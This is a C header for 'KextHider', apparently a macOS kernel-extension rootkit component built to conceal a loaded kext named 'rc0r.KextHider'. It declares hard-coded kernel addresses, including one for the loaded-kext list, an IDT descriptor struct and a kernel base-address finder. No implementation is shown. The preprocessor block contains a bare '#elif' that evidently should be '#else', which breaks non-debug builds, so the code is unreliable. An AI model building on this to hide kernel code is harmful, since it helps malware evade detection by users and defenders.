//
//  KextHider.h
//
#ifndef KextHider_KextHider_h
#define KextHider_KextHider_h

#include <mach-o/loader.h>
#include <mach/mach_types.h>
#include <sys/fcntl.h>
#include <sys/systm.h>
#include <sys/types.h>
//#include <sys/vnode.h>
//#include <libkern/c++/OSArray.h>
// make sure to add ~/xnu-2050.22.13/libkern/ to include path,
// otherwise we'll get complaints about missing .h files...
//#include <libkern/c++/OSKext.h>

#ifdef DEBUG
#define DLOG(args...) printf(args)
#elif
#define DLOG(args...) /* */
#endif

#define DEFAULT_KERNEL_SA 0xffffff8000200000
#define SKEXTLOADED_ADDR 0xFFFFFF80008AD0C8

const char *kextToHide = "rc0r.KextHider";

struct descriptor_idt
{
    uint16_t offset_low;
    uint16_t seg_selector;
    uint8_t reserved;
    uint8_t flag;
    uint16_t offset_middle;
    uint32_t offset_high;
    uint32_t reserved2;
};

uint64_t KERNEL_MH_START_ADDR;

//mach_vm_address_t *sLoadedKexts;

kern_return_t KextHider_start(kmod_info_t * ki, void *d);
kern_return_t KextHider_stop(kmod_info_t *ki, void *d);
uint64_t find_kernel_baseaddr( void );

#endif
